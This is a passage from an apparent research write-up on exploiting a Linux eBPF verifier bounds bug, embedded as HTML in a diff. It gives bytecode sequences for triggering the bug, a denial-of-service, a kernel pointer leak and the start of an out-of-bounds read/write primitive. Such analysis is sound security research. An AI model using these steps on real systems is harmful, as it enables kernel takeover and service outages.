toolchain to compile a program into bytecode) so it made using these tools less practical.
+
+</span></p><h3 id="viewer-3jc99"><span><strong>Verifier Log Output</strong></span></h3><p id="viewer-be76j"><span>When loading an eBPF program, you have the option to specify a log level and a buffer to receive log output from the verifier. </span></p><pre id="viewer-ros6"><span>char verifier_log_buff<span>[</span><span>0x200000</span><span>]</span> <span>=</span> <span>{</span><span>0</span><span>}</span><span>;</span>
+
+union bpf_attr prog_attrs <span>=</span>
+<span>{</span>
+    <span>.</span>prog_type <span>=</span> <span>BPF_PROG_TYPE_SOCKET_FILTER</span><span>,</span>
+    <span>.</span>insn_cnt <span>=</span> cnt<span>,</span>
+    <span>.</span>insns <span>=</span> <span>(</span>uint64_t<span>)</span>insn<span>,</span>
+    <span>.</span>license <span>=</span> <span>(</span>uint64_t<span>)</span><span>&#34;&#34;</span><span>,</span>
+    <span>.</span>log_level <span>=</span> <span>2</span><span>,</span>
+    <span>.</span>log_size <span>=</span> <span>sizeof</span><span>(</span>verifier_log_buff<span>)</span><span>,</span>
+    <span>.</span>log_buf <span>=</span> verifier_log_buff
+<span>}</span><span>;</span>
+
+</span></pre><p id="viewer-askh5"><span>This is useful for debugging  loading failure when the verifier rejects the program. </span></p><pre id="viewer-8nmrp"><span><span>34</span><span>:</span> <span>(</span>bf<span>)</span> r6 <span>=</span> r3
+<span>35</span><span>:</span> R0_w<span>=</span>invP0 R2_w<span>=</span><span>map_value</span><span>(</span>id<span>=</span><span>0</span><span>,</span>off<span>=</span><span>0</span><span>,</span>ks<span>=</span><span>4</span><span>,</span>vs<span>=</span><span>4919</span><span>,</span>imm<span>=</span><span>0</span><span>)</span> R3_w<span>=</span><span>map_value</span><span>(</span>id<span>=</span><span>0</span><span>,</span>off<span>=</span><span>0</span><span>,</span>ks<span>=</span><span>4</span><span>,</span>vs<span>=</span><span>4919</span><span>,</span>imm<span>=</span><span>0</span><span>)</span> R4_w<span>=</span>invP0 R5_w<span>=</span>invP4294967298 R6_w<span>=</span><span>map_value</span><span>(</span>id<span>=</span><span>0</span><span>,</span>off<span>=</span><span>0</span><span>,</span>ks<span>=</span><span>4</span><span>,</span>vs<span>=</span><span>4919</span><span>,</span>imm<span>=</span><span>0</span><span>)</span> R7_w<span>=</span><span>invP</span><span>(</span>id<span>=</span><span>0</span><span>)</span> <span>R10</span><span>=</span>fp0 fp<span>-</span><span>8</span><span>=</span>mmmm<span>?</span><span>?</span><span>?</span><span>?</span>
+<span>35</span><span>:</span> <span>(</span><span>7</span>b<span>)</span> <span>*</span><span>(</span>u64 <span>*</span><span>)</span><span>(</span>r2 <span>+</span><span>8</span><span>)</span> <span>=</span> r6
+<span>R6</span> leaks addr into map</span></pre><p id="viewer-c9dmo"><span> <em>Example verifier log output</em></span></p><p id="viewer-e6vg6"><span>Keep in mind that if you choose to provide a log output buffer, it should be large enough to receive the entire output. If it is not large enough, <strong>loading the program will fail. This will occur even if the program is valid and passes the verifier checks</strong>. This can occur if you are loading a long program, as the verifier prints output for every instruction on each path it traverses. I ran into this issue while writing my exploit, so I thought it was worth noting. 
+
+</span></p><h3 id="viewer-248q5"><span><strong>Runtime Debugging</strong></span></h3><p id="viewer-5nab"><span>Verifier log output provides a lot of useful info, particularly when playing with a verifier vulnerability. Being brand new to eBPF, I wanted to get familiar with the eBPF instruction set. I also wanted to be able to look at the values of registers during program runtime, like in a debugger such as gdb or Windbg. 
+
+</span></p><p id="viewer-brrjj"><span>I found that there isn’t really a straightforward way to do this, but I did find a solution.
+
+</span></p><p id="viewer-f50ug"><span>As previously mentioned, eBPF programs are either JIT compiled after verification and ran natively or decoded and executed within the eBPF interpreter. This depends on the kernel configuration <span><span> CONFIG_BPF_JIT </span></span>.  
+
+</span></p><p id="viewer-3i6jk"><span>If JIT is disabled, eBPF bytecode is decoded and executed in <span><span> kernel/bpf/core.c </span></span> in the function<span> </span><a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/core.c#L1362" target="_blank" rel="noopener noreferrer"><span>___bpf_prog_run</span></a><span> </span>:</span></p><pre id="viewer-ev0ro"><span><span>/**
+ *    __bpf_prog_run - run eBPF program on a given context
+ *    @regs: is the array of MAX_BPF_EXT_REG eBPF pseudo registers
+ *    @insn: is the array of eBPF instructions
+ *
+ * Decode and execute eBPF instructions.
+ */</span>
+ 
+<span>static</span> u64 <span>___bpf_prog_run</span><span>(</span><span>u64 *regs, const struct bpf_insn *insn</span><span>)</span>
+<span>{</span>
+<span>...</span>
+ select_insn<span>:</span>
+        goto <span>*</span>jumptable<span>[</span>insn<span>-</span><span>&gt;</span>code<span>]</span><span>;</span>
+<span>...</span>
+<span>}</span>
+
+</span></pre><p id="viewer-cvf58"><span>Register values are pointed to by <span><span> regs </span></span> and the program instructions by <span><span> insn </span></span>. </span></p><p id="viewer-6gppp"><span>To get the value of a register during each instruction of the program, you can simply insert a 
+<span><span> printk </span></span> statement before each instruction is executed. An example is shown below:</span></p><pre id="viewer-83ovj"><span><span>static</span> u64 <span>___bpf_prog_run</span><span>(</span><span>u64 *regs, const struct bpf_insn *insn</span><span>)</span>
+<span>{</span>
+<span>...</span>
+    int lol <span>=</span> <span>0</span><span>;</span>
+   
+   <span>// Check the first instruction to match the first instruction of  </span>
+   <span>// the target eBPF program to debug, so output isn&#39;t printed for  </span>
+   <span>// every eBPF program that is ran.</span>
+    <span>if</span><span>(</span>insn<span>-</span><span>&gt;</span>code <span>==</span> <span>0xb7</span><span>)</span>
+    <span>{</span>
+        lol <span>=</span> <span>1</span><span>;</span>
+    <span>}</span>
+
+
+select_insn<span>:</span>
+        <span>if</span><span>(</span>lol<span>)</span>
+        <span>{</span>
+            <span>printk</span><span>(</span><span>&#34;instruction is: %0x\n&#34;</span><span>,</span> insn<span>-</span><span>&gt;</span>code<span>)</span><span>;</span>
+            <span>printk</span><span>(</span><span>&#34;r0: %llx, r1: %llx, r2: %llx\n&#34;</span><span>,</span> regs<span>[</span><span>0</span><span>]</span><span>,</span> 
+            regs<span>[</span><span>1</span><span>]</span><span>,</span> regs<span>[</span><span>2</span><span>]</span><span>)</span><span>;</span>
+            <span>...</span>
+        <span>}</span>
+        goto <span>*</span>jumptable<span>[</span>insn<span>-</span><span>&gt;</span>code<span>]</span><span>;</span>
+<span>...</span>
+<span>}</span></span></pre><p id="viewer-bnpdi"><span>You will need to compile the kernel yourself with <span><span> CONFIG_BPF_JIT </span></span> disabled. For a quick startup on how to compile a kernel yourself and run it with <span><span> qemu </span></span>, check out <a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener noreferrer">syzkaller’s guide</a><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener noreferrer"> </a><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener noreferrer">[11]</a>. 
+
+</span></p><p id="viewer-7cu9n"><span>This helped me learn the instruction set, and figure out the calling convention for calling eBPF helper functions. It also helped me identify some new mitigations introduced into ALU Sanitation that I will cover later. </span></p><h2 id="viewer-cguas"><span>Exploitation</span></h2><h3 id="viewer-9j3k6"><span>
+Triggering the Vulnerability</span></h3><p id="viewer-veg4"><span>The specifics of the bug were covered in the Vulnerability section. Here, I will go through the bytecode triggers the bug.
+
+</span></p><p id="viewer-aqg9p"><span>Remember, we need two registers with <span><span> tnum </span></span>s in the same state as shown in the example. That is, one register with <span><span> var_off = {mask = 0xFFFFFFFF00000000; value = 0x1} </span></span> and one with <span><span> var_off = {mask = 0x0; value = 0x100000002} </span></span>. </span></p><p id="viewer-2sp08"><span>The latter is easy. Since all the bits are known, we can load the register with the constant value. We will store this value in arbitrary register referred to as <span><span> CONST_REG </span></span>. Due to the instruction op size, we are restricted to working with 32 bit values. We create the 64 bit value (0x100000002) across a few instructions:</span></p><pre id="viewer-8thto"><span><span>// Load 1 into the register</span>
+<span>BPF_MOV64_IMM</span><span>(</span><span>CONST_REG</span><span>,</span> <span>0x1</span><span>)</span>
+<span>// Left shift 32 bits, the value is now 0x100000000</span>
+<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_LSH</span><span>,</span> <span>CONST_REG</span><span>,</span> <span>32</span><span>)</span>
+<span>// Add 2, the value is now 0x100000002</span>
+<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>CONST_REG</span><span>,</span> <span>2</span><span>)</span></span></pre><p id="viewer-7q8n2"><span>Now, for the other register: we need to have the upper 32 bits of <span><span> mask </span></span> set. We can start with a value that is unknown to the verifier, meaning that all the bits of <span><span> mask </span></span> are set. The most straightforward way to do this is to load a value from a eBPF map. This way, we can also control the actual value at runtime, which will become useful later. First, we need to retrieve a pointer an eBPF map we create prior to loading the program, which has file descriptor  <span><span> store_map_fd </span></span>. </span></p><pre id="viewer-2obve"><span><span>// Load a pointer to the store_map_fd map into R1. </span>
+<span>BPF_LD_MAP_FD</span><span>(</span><span>BPF_REG_1</span><span>,</span> store_map_fd<span>)</span>
+<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_2</span><span>,</span> <span>BPF_STACK_REG</span><span>)</span>
+<span>// Load 0 into R0</span>
+<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0</span><span>)</span>
+<span>// Store value of R0=0 at stack_ptr-4.</span>
+<span>BPF_STX_MEM</span><span>(</span><span>BPF_W</span><span>,</span> <span>BPF_STACK_REG</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>-</span><span>4</span><span>)</span>
+<span>// Set R2= stack_ptr-4</span>
+<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_2</span><span>,</span> <span>BPF_STACK_REG</span><span>)</span>
+<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_2</span><span>,</span> <span>-</span><span>4</span><span>)</span>
+<span>// Call helper function map_lookup_elem. First parameter is in R1 // (map pointer). Second parameter is in R2, (ptr to elem index   // value).  *(word*)(stack_ptr-4) = 0</span>
+<span>BPF_RAW_INSN</span><span>(</span><span>BPF_JMP</span> <span>|</span> <span>BPF_CALL</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> BPF_FUNC_map_lookup_elem<span>)</span>     </span></pre><p id="viewer-3ouc4"><span>Now a pointer to the first element in our map will be returned in register <span><span> R0 </span></span>. From there we can read from it and load a value into an arbitrary register I will refer to as <span><span> EXPLOIT_REG </span></span>. That will be our second bug-triggering register. </span></p><pre id="viewer-ffvpa"><span><span>// Read 8 bytes from returned map element pointer and store it in // EXPLOIT_REG.</span>
+<span>BPF_LDX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span><span>EXPLOIT_REG</span><span>,</span> <span>BPF_REG_R0</span><span>,</span> <span>0</span><span>)</span></span></pre><p id="viewer-7ji2l"><span>Since user space has full control over what is stored in an eBPF map, the verifier will mark this register as having a completely unknown value. That is, <span><span> var_off = {mask = 0xFFFFFFFFFFFFFFFF; value = 0x0} </span></span>.  Now, we just have to set the lower 32 bits as known with value 1. </span></p><pre id="viewer-arh84"><span><span>// Set R2 to be 0xFFFFFFFF</span>
+<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_2</span><span>,</span> <span>0xFFFFFFFF</span><span>)</span>
+<span>// Left shift R2 32 bits, so the value is now 0xFFFFFFFF00000000</span>
+<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_LSH</span><span>,</span> <span>BPF_REG_2</span><span>,</span> <span>32</span><span>)</span>
+<span>// AND EXPLOIT_REG and R2 and store the results in EXPLOIT_REG</span>
+<span>// The upper 32 bits will remain unknown, but the 32 bits are known // to be zero</span>
+<span>BPF_ALU64_REG</span><span>(</span><span>BPF_AND</span><span>,</span> <span>EXPLOIT_REG</span><span>,</span> <span>BPF_REG_2</span><span>)</span>
+<span>// Add 1 to EXPLOIT_REG, it now has mask = 0xFFFFFFFF00000000 and // value = 0x1</span>
+<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>EXPLOIT_REG</span><span>,</span> <span>1</span><span>)</span>
+
+</span></pre><p id="viewer-d9n8f"><span>Now we  trigger the vulnerability by performing an AND operation on the two registers we set up. </span></p><pre id="viewer-easf3"><span><span>// Trigger the bug, EXPLOIT_REG now has u32_min_value=1,           // u32_max_value=0</span>
+<span>BPF_ALU64_REG</span><span>(</span><span>BPF_AND</span><span>,</span> <span>EXPLOIT_REG</span><span>,</span> <span>CONST_REG</span><span>)</span></span></pre><p id="viewer-ahjls"><span>The actual value we store in the map, and thus the value of <span><span> EXPLOIT_REG </span></span>, will be set to 0. We’ll use that later on. </span></p><h2 id="viewer-2gj7r"><span>Denial of Service (DoS)</span></h2><p id="viewer-9cs25"><span>We now have a register <span><span> EXPLOIT_REG </span></span>, with invalid 32 bit bounds <span><span> u32_min_value=1 </span></span> and 
+<span><span> u32_max_value=0 </span></span>. 
+
+</span></p><p id="viewer-8n8vg"><span>My first attempt at exploitation wasn’t useful for LPE but it did result in an easy DoS exploit. I learned a bit more about how the verifier patches bytecode in the process.
+
+</span></p><p id="viewer-85t01"><span>Recall that the verifier checks all possible execution paths. This can be computationally costly, so optimizations are performed to reduce the number of paths it needs to traverse. One is using the bounds of a register to determine the outcome of a conditional statement. 
+
+</span></p><p id="viewer-274q7"><span>For example:</span></p><pre id="viewer-627hu"><span><span>BPF_JMP32_IMM</span><span>(</span><span>BPF_JGE</span><span>,</span> <span>EXPLOIT_REG</span><span>,</span> <span>1</span><span>,</span> <span>5</span><span>)</span></span></pre><p id="viewer-f28s6"><span>The above instruction will jump five instructions if the value of the lower 32 bits of EXPLOIT_REG is greater than or equal to 1. </span></p><p id="viewer-5inso"><span>For a <span><span> JGE </span></span> 32 bit conditional, the verifier will attempt to determine if only one branch is taken by checking the <span><span> u32_min_value </span></span> of the register:</span></p><pre id="viewer-6asdl"><span><span>static</span> int <span>is_branch32_taken</span><span>(</span><span>struct bpf_reg_state *reg, u32 val, u8 opcode</span><span>)</span>
+<span>{</span>
+        struct tnum subreg <span>=</span> <span>tnum_subreg</span><span>(</span>reg<span>-</span><span>&gt;</span>var_off<span>)</span><span>;</span>
+        s32 sval <span>=</span> <span>(</span>s32<span>)</span>val<span>;</span>
+
+
+        <span>switch</span> <span>(</span>opcode<span>)</span> <span>{</span>
+<span>...</span>
+        <span>case</span> <span>BPF_JGE</span><span>:</span>
+                <span>if</span> <span>(</span>reg<span>-</span><span>&gt;</span>u32_min_value <span>&gt;=</span> val<span>)</span>
+                       <span>return</span> <span>1</span><span>;</span>
+                <span>else</span> <span>if</span> <span>(</span>reg<span>-</span><span>&gt;</span>u32_max_value <span>&lt;</span> val<span>)</span>
+                        <span>return</span> <span>0</span><span>;</span>
+<span>.</span><span>.</span>
+<span>}</span></span></pre><p id="viewer-3jlhh"><span>Notice that <span><span> </span></span><a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L7997" target="_blank" rel="noopener noreferrer"><span><span>is_branch32_taken</span></span></a><span><span> </span></span> will return true if <span><span> u32_min_value &gt;= 1 </span></span>.  Because 
+<span><span> EXPLOIT_REG </span></span> has the invalid bound <span><span> u32_min_value = 1 </span></span>, it returns <span><span> TRUE </span></span>. This means that the verifier believes the <span><span> TRUE </span></span> branch will always be taken, and will not check the <span><span> FALSE </span></span> branch. In reality, <span><span> EXPLOIT_REG </span></span> will have a value of 0 at runtime, so it <em>will</em> take the <span><span> FALSE </span></span> branch. This means that we can put any instructions we’d like in the <span><span> FALSE </span></span> branch and the verifier won’t check them for safety! 
+
+</span></p><p id="viewer-acapj"><span>At this point, I thought that I would be able to insert the rest of my exploit into this branch and have free rein. However, the verifier patches all instructions in “dead” branches.</span></p><pre id="viewer-aeko9"><span><span>/* The verifier does more data flow analysis than llvm and will not
+ * explore branches that are dead at run time. Malicious programs  
+ * can have dead code too. Therefore replace all dead at-run-time  
+ * code with &#39;ja -1&#39;.
+ *
+ * Just nops are not optimal, e.g. if they would sit at the end of 
+ * the program and through another bug we would manage to jump     
+ * there, then we&#39;d execute beyond program memory otherwise.   
+ * Returning exception code also wouldn&#39;t work since we can have   
+ * subprogs where the dead code could be located.
+ */</span>
+<span>static</span> <span>void</span> <span>sanitize_dead_code</span><span>(</span><span>struct bpf_verifier_env *env</span><span>)</span>
+<span>{</span>
+    struct bpf_insn_aux_data <span>*</span>aux_data <span>=</span> env<span>-</span><span>&gt;</span>insn_aux_data<span>;</span>
+    struct bpf_insn trap <span>=</span> <span>BPF_JMP_IMM</span><span>(</span><span>BPF_JA</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>-</span><span>1</span><span>)</span><span>;</span>
+    struct bpf_insn <span>*</span>insn <span>=</span> env<span>-</span><span>&gt;</span>prog<span>-</span><span>&gt;</span>insnsi<span>;</span>
+    <span>const</span> int insn_cnt <span>=</span> env<span>-</span><span>&gt;</span>prog<span>-</span><span>&gt;</span>len<span>;</span>
+    int i<span>;</span>
+    
+    <span>for</span> <span>(</span>i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> insn_cnt<span>;</span> i<span>++</span><span>)</span> <span>{</span>
+            <span>if</span> <span>(</span>aux_data<span>[</span>i<span>]</span><span>.</span>seen<span>)</span>
+                   <span>continue</span><span>;</span>
+            <span>memcpy</span><span>(</span>insn <span>+</span> i<span>,</span> <span>&amp;</span>trap<span>,</span> <span>sizeof</span><span>(</span>trap<span>)</span><span>)</span><span>;</span>
+    <span>}</span>
+<span>}</span></span></pre><p id="viewer-512p3"><span>Above, the function <span><span> </span></span><a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L11570" target="_blank" rel="noopener noreferrer"><span><span>sanitize_dead_code</span></span></a><span><span> </span></span> , is where this patching occurs. Interestingly, it patches all the dead instructions with a <span><span> jmp - 1 </span></span> instruction. Meaning that once it hits the dead code path, it will go backwards one instruction, execute the conditional statement, then again to the jump back one instruction, in a never ending loop.
+
+</span></p><p id="viewer-a530i"><span>This leads to the kernel thread idling forever.  You can run a few instances of the exploit, lock up all available kernel threads, and cause a DoS.
+
+</span></p><h2 id="viewer-sdb4"><span>Map Pointer Leak</span></h2><p id="viewer-3hpen"><span>My second instinct was to use the register with invalid boundaries to widen the “safe” range for pointer arithmetic. 
+
+</span></p><p id="viewer-8lvmc"><span>As previously mentioned, the verifier keeps track of which registers contain pointers and which contain scalars. While I was looking at the code I came across an interesting snippet:</span></p><pre id="viewer-an76o"><span><span>/* Handles arithmetic on a pointer and a scalar: computes new      
+ * min/max and var_off.
+ * Caller should also handle BPF_MOV case separately.
+ * If we return -EACCES, caller may want to try again treating     
+ * pointer as a scalar.  So we only emit a diagnostic if           
+ * !env-&gt;allow_ptr_leaks.
+ */</span>
+<span>static</span> int <span>adjust_ptr_min_max_vals</span><span>(</span><span>struct bpf_verifier_env *env,
+                                struct bpf_insn *insn,
+                                const struct bpf_reg_state 
+                                             *ptr_reg,
+                                const struct bpf_reg_state 
+                                             *off_reg</span><span>)</span>
+<span>{</span>
+<span>...</span>
+    bool known <span>=</span> <span>tnum_is_const</span><span>(</span>off_reg<span>-</span><span>&gt;</span>var_off<span>)</span><span>;</span>
+    s64 smin_val <span>=</span> off_reg<span>-</span><span>&gt;</span>smin_value<span>;</span>
+    smax_val <span>=</span> off_reg <span>-</span><span>&gt;</span> smax_value<span>;</span>
+    smin_ptr <span>=</span> ptr_reg<span>-</span><span>&gt;</span>smin_value<span>;</span>
+    smax_ptr <span>=</span> ptr_reg<span>-</span><span>&gt;</span> smax_value<span>;</span>
+    u64 umin_val <span>=</span> off_reg<span>-</span><span>&gt;</span>umin_value<span>;</span>
+    umax_val <span>=</span> off_reg<span>-</span><span>&gt;</span> umax_value<span>;</span>
+    umin_ptr <span>=</span> ptr_reg<span>-</span><span>&gt;</span>umin_value<span>;</span>
+    umax_ptr <span>=</span> ptr_reg<span>-</span><span>&gt;</span> umax_value<span>;</span>
+<span>...</span>
+    <span>if</span> <span>(</span><span>(</span>known <span>&amp;&amp;</span> <span>(</span>smin_val <span>!=</span> smax_val <span>||</span> umin_val <span>!=</span> umax_val<span>)</span><span>)</span> <span>||</span> smin_val <span>&gt;</span> smax_val <span>||</span> umin_val <span>&gt;</span> umax_val<span>)</span> <span>{</span>
+        <span>/* Taint dst register if offset had invalid bounds derived             
+        *  from e.g. dead branches.
+        */</span>
+            <span>__mark_reg_unknown</span><span>(</span>env<span>,</span> dst_reg<span>)</span><span>;</span>
+            <span>return</span> <span>0</span><span>;</span>
+    <span>}</span>
+<span>...</span>
+<span>}</span>
+
+</span></pre><p id="viewer-d5u8u"><span>The function <span><span> </span></span><a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L6672" target="_blank" rel="noopener noreferrer"><span><span>adjust_ptr_min_max_vals</span></span></a><span><span> </span></span> shown above is called for arithmetic instructions involving a pointer. The register <span><span> off_reg </span></span> represents the offset scalar register being added to a pointer register. Notice that if the offset register has bounds such that  <span><span> umin_value &gt; umax_value </span></span>, the function <span><span> __mark_reg_unknown </span></span> is called on the destination register. This function marks the register as containing an unknown scalar value.</span></p><p id="viewer-a92ri"><span>This means that if we have a register <span><span> EXPLOIT_REG </span></span> with bounds <span><span> umin_value &gt; umax_value </span></span> and add it to a destination pointer register, the pointer register will be changed to a scalar. So, the verifier will no longer think that the register contains a pointer! This is notable because the verifier will now allow us to leak its value to user space by storing it in a eBPF map.</span></p><p id="viewer-eotv"><span>First, we need to extend the invalid 32 bit bounds <span><span> u32_min_value, u32_max_value </span></span> to their 64 bit counterparts <span><span> umin_value, umax_value </span></span>.</span></p><pre id="viewer-5pd7k"><span><span>// Zero extend the lower 32 bits of EXPLOIT_REG</span>
+<span>BPF_MOV32_REG</span><span>(</span><span>EXPLOIT_REG</span><span>,</span> <span>EXPLOIT_REG</span><span>)</span></span></pre><p id="viewer-522n0"><span>Next, do any arithmetic operation with a map pointer stored in <span><span>OOB_MAP_REG</span></span>  with <span><span>EXPLOIT_REG</span></span> . Store its value in <span><span>STORE_MAP_REG</span></span>, which contains a pointer to another eBPF map that can be accessed from user space.</span></p><pre id="viewer-3b958"><span><span>BPF_ALU64_REG</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>OOB_MAP_REG</span><span>,</span> <span>EXPLOIT_REG</span><span>)</span>
+<span>BPF_STX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>STORE_MAP_REG</span><span>,</span> <span>OOB_MAP_REG</span><span>,</span> <span>0</span><span>)</span></span></pre><p id="viewer-9v715"><span>We have now leaked the kernel address of an eBPF map, which we will use later on in the exploit! 
+
+</span></p><p id="viewer-a6ad0"><span><em>Note: this can also be done once we have established kernel read/write primitives. This is done by accessing the <span><span> private_data </span></span> structure of the file from the <span><span>fd</span></span> table, which we can get once we have the address of the thread’s <span><span> task_struct </span></span>. However, this requires many more dependencies on hardcoded kernel offsets. I like to avoid this whenever possible, as it makes exploits more annoying to maintain. I thought this shortcut was a nice improvement. </em></span></p><h3 id="viewer-f3bd5"><span>Verifier Range Tracking Primitive</span></h3><p id="viewer-2g5rk"><span>Now, we create a primitive that will allow us to make out of bound read/writes. This will give us arbitrary read/write in the kernel. The idea is that we can create a register that the verifier believes has a value of 0, but really has a value of 1 during runtime.
+
+</span></p><p id="viewer-14go2"><span>First, trigger the bug, where we have <span><span> EXPLOIT_REG </span></span> with invalid 32 bit bounds <span><span>u32_max_value = 0 &lt; u32_min_value = 1 </span></span>.  
+
+</span></p><p id="viewer-a77a3"><span>Next, add 1 to <span><span> EXPLOIT_REG </span></span>.</span></p><pre id="viewer-8rs99"><span><span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>EXPLOIT_REG</span><span>,</span> <span>1</span><span>)</span></span></pre><p id="viewer-8i4lh"><span>In the case of immediate instructions, the immediate value is simply added to all the bounds, if adding the value will not cause an overflow. Thus, after adding 1 to <span><span> EXPLOIT_REG </span></span>, we have <span><span> u32_max_value = 1 </span></span> and <span><span> u32_min_value = 2 </span></span>, with <span><span> var_off = {0x100000000; value = 0x1} </span></span>.</span></p><p id="viewer-7sbju"><span>Now we need a register with an initially unknown value. Let’s call this register 
+<span><span> UNKNOWN_VALUE_REG </span></span>. We create the register the same way as before, by loading a value from a eBPF map. The real runtime value of the register will be 0. Then, we start to manipulate the bounds of the register by adding a conditional <span><span> jmp </span></span> statement:</span></p><pre id="viewer-735f9"><span><span>BPF_JMP32_IMM</span><span>(</span><span>BPF_JLE</span><span>,</span> <span>UNKOWN_VALUE_REG</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
+<span>BPF_EXIT_INSN</span><span>(</span><span>)</span></span></pre><p id="viewer-b8qqm"><span>The above conditional <span><span> jmp32 </span></span> instruction will skip the exit instruction if the value of the lower 32 bits of the register is less than or equal to 1. Because the actual value of the register will be 0, the conditional statement will evaluate to <span><span> TRUE </span></span> and the exit instruction will be skipped. However, because the verifier does not know what the value will be, the 32 bit bounds of the register in the <span><span> TRUE </span></span> branch will be set to: u32_min_value = 0 and u32_max_value = 1. Remember, the <span><span>jmp</span></span> was conditional on the lower 32 bits, so the upper 32 bits are still unknown. The lowest bit is also unknown, since it can be either 0 or 1. So this register has <span><span> var_off = {mask = 0xFFFFFFFF00000001; value = 0x0} </span></span>. </span></p><p id="viewer-7g6lk"><span>Now, let’s look at how these bounds are updated when two registers are added together:</span></p><pre id="viewer-1i246"><span><span>BPF_ALU64_REG</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>EXPLOIT_REG</span><span>,</span> <span>UNKOWN_VALUE_REG</span><span>)</span></span></pre><p id="viewer-frf0d"><span>First, in <span><span> </span></span><a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L7479" target="_blank" rel="noopener noreferrer"><span><span>adjust_scalar_min_max_vals</span></span></a><span><span> </span></span>:</span></p><pre id="viewer-5dfml"><span><span>static</span> int <span>adjust_scalar_min_max_vals</span><span>(</span><span>struct bpf_verifier_env *env,
+                                      struct bpf_insn *insn,
+                                      struct bpf_reg_state 
+                                             *dst_reg,
+                                      struct bpf_reg_state src_reg</span><span>)</span>
+<span>{</span>
+  <span>...</span>
+    <span>switch</span> <span>(</span>opcode<span>)</span> <span>{</span>
+        <span>case</span> <span>BPF_ADD</span><span>:</span>
+            <span>scalar32_min_max_add</span><span>(</span>dst_reg<span>,</span> <span>&amp;</span>src_reg<span>)</span><span>;</span>
+            <span>scalar_min_max_add</span><span>(</span>dst_reg<span>,</span> <span>&amp;</span>src_reg<span>)</span><span>;</span>
+            dst_reg<span>-</span><span>&gt;</span>var_off <span>=</span> <span>tnum_add</span><span>(</span>dst_reg<span>-</span><span>&gt;</span>var_off<span>,</span> 
+                                        src_reg<span>.</span>var_off<span>)</span><span>;</span>
+            <span>break</span><span>;</span>
+
+<span>...</span>
+<span>}</span></span></pre><p id="viewer-6dmos"><span>The scalar add functions are called. Let’s look at the <span><span> </span></span><a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L6908" target="_blank" rel="noopener noreferrer"><span><span>32 bit case</span></span></a><span><span> </span></span>: </span></p><pre id="viewer-b60ka"><span><span>static</span> <span>void</span> <span>scalar32_min_max_add</span><span>(</span><span>struct bpf_reg_state *dst_reg,
+                                 struct bpf_reg_state *src_reg</span><span>)</span>
+<span>{</span>
+    s32 smin_val <span>=</span> src_reg<span>-</span><span>&gt;</span>s32_min_value<span>;</span>
+    s32 smax_val <span>=</span> src_reg<span>-</span><span>&gt;</span>s32_max_value<span>;</span>
+    u32 umin_val <span>=</span> src_reg<span>-</span><span>&gt;</span>u32_min_value<span>;</span>
+    u32 umax_val <span>=</span> src_reg<span>-</span><span>&gt;</span>u32_max_value<span>;</span>
+
+<span>...</span>
+    <span>if</span> <span>(</span>dst_reg<span>-</span><span>&gt;</span>u32_min_value <span>+</span> umin_val <span>&lt;</span> umin_val <span>||</span>
+        dst_reg<span>-</span><span>&gt;</span>u32_max_value <span>+</span> umax_val <span>&lt;</span> umax_val<span>)</span> <span>{</span>
+            dst_reg<span>-</span><span>&gt;</span>u32_min_value <span>=</span> <span>0</span><span>;</span>
+            dst_reg<span>-</span><span>&gt;</span>u32_max_value <span>=</span> <span>U32_MAX</span><span>;</span>
+        <span>}</span> <span>else</span> <span>{</span>
+            dst_reg<span>-</span><span>&gt;</span>u32_min_value <span>+=</span> umin_val<span>;</span>
+            dst_reg<span>-</span><span>&gt;</span>u32_max_value <span>+=</span> umax_val<span>;</span>
+        <span>}</span>
+<span>}</span></span></pre><p id="viewer-5761j"><span>If the addition operation doesn’t overflow either of the bounds, the bounds of the destination and source register are simply added together.  This will result in <span><span> EXPLOIT_REG </span></span> having new 32 bit bounds: <span><span> u32_min_value = 2, u32_max_value = 2 </span></span>!
+
+</span></p><p id="viewer-91j3l"><span>Next, on line 11 in the above snippet of <span><span> adjust_scalar_min_max_vals </span></span>,  <span><span> tnum_add </span></span> will be called and saved to var_off of the destination register. This function will return information from what is known after adding two <span><span> tnum </span></span>s together. </span></p><p id="viewer-2mshj"><span>Our registers are <span><span> EXPLOIT_REG </span></span>: <span><span> var_off = {0x100000000; value = 0x1} </span></span> and 
